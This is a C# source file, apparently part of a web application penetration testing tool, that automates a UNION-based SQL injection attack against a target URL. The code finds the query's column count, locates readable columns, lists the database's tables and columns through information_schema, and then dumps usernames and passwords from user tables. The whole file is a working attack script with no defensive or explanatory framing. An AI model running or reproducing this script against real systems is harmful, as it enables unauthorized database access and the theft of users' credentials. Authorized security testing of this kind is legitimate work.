using System;
using System.Collections.Generic;
using System.Text;
using System.Text.RegularExpressions;

namespace WAPTT.Scripts
{
    class SQL_Injection_UNION_Based
    {
        public static string reportResults = String.Empty;


        public static void Script(string url)
        {
            reportResults = "--- STARTING UNION-BASED SQLI ---\n\n\n\n";

            string[] parms = SQL_Is_Vulnerable.URLParameters(url).Split('&');

            if (parms.Length == 0)
            {
                reportResults += "Script stopped: URL not vulnerable to SQLi";
            }
            else
            {
                string vulnParm = String.Empty;
                string sqlURL = String.Empty;
                int columnNumber = 0;

                foreach (string parm in parms)
                {
                    reportResults += $"--- TESTING PARAMETER \"{parm}\" ---\n\n\n\n";
                    
                    vulnParm = parm + "asdf' UNION SELECT null";
                    sqlURL = url.Replace(parm, vulnParm + "-- ");

                    while (HTTP_Connection.Response(sqlURL).Contains("different number of columns"))
                    {
                        sqlURL = sqlURL.Replace(vulnParm, vulnParm + ",null");
                        vulnParm += ",null";
                    }

                    columnNumber = Regex.Matches(vulnParm, "null").Count;
                    reportResults += $"Number of columns in SELECT statement of parameter \"{parm}\": {columnNumber}\n\n\n";

                    string chars = "1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
                    char[] frontRandomArray = new char[8];
                    char[] middleRandomArray = new char[8];
                    char[] endRandomArray = new char[8];
                    Random random = new Random();

                    for (int i = 0; i < 8; i++)
                    {
                        frontRandomArray[i] = chars[random.Next(chars.Length)];
                        middleRandomArray[i] = chars[random.Next(chars.Length)];
                        endRandomArray[i] = chars[random.Next(chars.Length)];
                    }
                    

                    string frontRandom = new string(frontRandomArray);
                    string middleRandom = new string(middleRandomArray);
                    string endRandom = new string(endRandomArray);


                    string whichColumnToUse = "L00kfOrThIs";
                    string readableColumnURL = String.Empty;
                    string extractDBNameURL = String.Empty;
                    string extractTablesURL = String.Empty;
                    string extractColumnsURL = String.Empty;
                    string extractConfidentialDataURL = String.Empty;

                    string dbName = String.Empty;
                    int col = 0;

                    for (int i = sqlURL.IndexOf("null"); i < sqlURL.IndexOf("-- "); i += 5)
                    {
                        col++;

                        string payload = $"CONCAT('{frontRandom}', '{whichColumnToUse}', '{endRandom}')";
                        readableColumnURL = sqlURL.Substring(0, i) + payload + sqlURL.Substring(i + 4);

                        if (HTTP_Connection.Response(readableColumnURL).Contains(frontRandom + whichColumnToUse + endRandom))
                        {
                            reportResults += $"Column no. {col} seems to contain readable data... EXTRACTING TABLES\n\n";
                        }


                        
                        payload = $"CONCAT('{frontRandom}', DATABASE(), '{endRandom}')";
                        extractDBNameURL = sqlURL.Substring(0, i) + payload + sqlURL.Substring(i + 4);

                        Regex regex = new Regex(frontRandom + "([^,' ].*?)" + endRandom);

                        Match dbMatch = regex.Match(HTTP_Connection.Response(extractDBNameURL));
                        dbName = dbMatch.Groups[1].Value;

                        reportResults += $"Database name: {dbName}\n\n";



                        payload = $"CONCAT('{frontRandom}', table_name, '{endRandom}')";
                        extractTablesURL = sqlURL.Substring(0, i) + payload + sqlURL.Substring(i + 4);
                        extractTablesURL = extractTablesURL.Replace("-- ", " FROM information_schema.tables-- ");

                        MatchCollection tableMatches = regex.Matches(HTTP_Connection.Response(extractTablesURL));

                        List<string> userTables = new List<string>();

                        reportResults += $"Extracted tables from {dbName} database:\n\n\n";
                        foreach (Match m in tableMatches)
                        {
                            reportResults += "\t" + m.Groups[1].Value + "\n";
                            if (m.Groups[1].Value.Contains("users"))
                            {
                                userTables.Add(m.Groups[1].Value);
                            }
                        }

                        if (userTables.Count != 0)
                        {
                            reportResults += $"\nFound {userTables.Count} tables containing word \"users\":\n\n\n";
                        }

                        foreach (string str in userTables)
                        {
                            reportResults += "\t---  \"" + str + "\"  ---\n";
                        }

                        if (userTables.Count == 0)
                            return;

                        payload = $"CONCAT('{frontRandom}', column_name, '{endRandom}')";

                        foreach (string tableName in userTables)
                        { 
                            extractColumnsURL = sqlURL.Substring(0, i) + payload + sqlURL.Substring(i + 4);
                            extractColumnsURL = extractColumnsURL.Replace("-- ", $" FROM information_schema.columns WHERE table_name='{tableName}'-- ");

                            tableMatches = regex.Matches(HTTP_Connection.Response(extractColumnsURL));

                            List<string> valuableColumns = new List<string>();

                            if (tableMatches.Count == 0)
                                return;

                            reportResults += $"\n\nExtracted columns from {tableName}.{dbName} table:\n\n";
                            foreach (Match m in tableMatches)
                            {
                                reportResults += "\t" + m.Groups[1].Value + "\n";

                                if (m.Groups[1].Value.Contains("user") || m.Groups[1].Value.Contains("password"))
                                {
                                    valuableColumns.Add(m.Groups[1].Value);
                                }
                            }

                            if (valuableColumns.Count == 0)
                                return;

                            reportResults += $"\nFound {valuableColumns.Count} columns in {tableName}.{dbName}, which possibly contain confidential data:\n\n";

                            foreach (string s in valuableColumns)
                            {
                                reportResults += "\t---  \"" + s + "\"  ---\n";
                            }

                            

                            reportResults += "\nEXTRACTING USERNAMES AND PASSWORDS\n\n";

                            payload = $"CONCAT('{frontRandom}', user, '{middleRandom}', password, '{endRandom}')";

                            extractConfidentialDataURL = sqlURL.Substring(0, i) + payload + sqlURL.Substring(i + 4);
                            extractConfidentialDataURL = extractConfidentialDataURL.Replace("-- ", $" FROM {tableName}-- ");

                            Regex regexUserPassword = new Regex(frontRandom + "([^,' ].*?)" + middleRandom + "([^,' ].*?)" + endRandom);

                            tableMatches = regexUserPassword.Matches(HTTP_Connection.Response(extractConfidentialDataURL));

                            if (tableMatches.Count == 0)
                            {
                                reportResults += "No data found!\n";
                                return;
                            }

                            foreach (Match m in tableMatches)
                            {
                                reportResults += "Username: " + m.Groups[1].Value + "    Password: " + m.Groups[2].Value + "\n";
                            }
                        }
                    }
                }
            }
            reportResults += "\n\n--- END ---";
        }
    }
}
